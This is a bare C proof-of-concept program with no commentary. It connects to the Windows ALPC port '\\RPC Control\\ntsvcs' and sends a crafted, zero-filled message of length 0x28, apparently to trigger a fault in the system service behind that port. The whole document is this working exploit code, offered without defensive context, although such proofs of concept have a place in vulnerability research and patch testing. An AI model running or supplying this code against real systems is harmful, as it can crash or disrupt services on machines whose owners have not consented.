#include <stdio.h>
#include "alpc.h"

int main(int argc, char **argv)
{
	static const CSHORT POC_MESSAGE_LEN = 0x28;

	NTSTATUS status;
	HANDLE hConnection;
	UNICODE_STRING usPortName;
	ALPC_PORT_ATTRIBUTES portAttributes = { 0 };
	PORT_MESSAGE sendMessage = { 0 };

	portAttributes.MaxMessageLength = POC_MESSAGE_LEN;
	sendMessage.u1.s1.TotalLength = POC_MESSAGE_LEN;

	RtlInitUnicodeString(&usPortName, L"\\RPC Control\\ntsvcs");

	status = NtAlpcConnectPort(&hConnection,
		&usPortName,
		0,	/* ObjectAttributes */
		&portAttributes,
		ALPC_MSGFLG_SYNC_REQUEST,
		0,	/* RequiredServerSid */
		0,	/* ConnectionMessage */
		0,	/* BufferLength */
		0,	/* OutMessageAttributes */
		0,	/* InMessageAttributes */
		0);	/* Timeout */

	if (NT_SUCCESS(status))
	{
		NtAlpcSendWaitReceivePort(hConnection,
			0,	/* Flags */
			&sendMessage,
			0,	/* SendMessageAttributes */
			0,	/* ReceiveMessage */
			0,	/* BufferLength */
			0,	/* ReceiveMessageAttributes */
			0);	/* timeout */
		
		return 0;
	}

	printf("ALPC connect failed!\n");
	return -1;
}

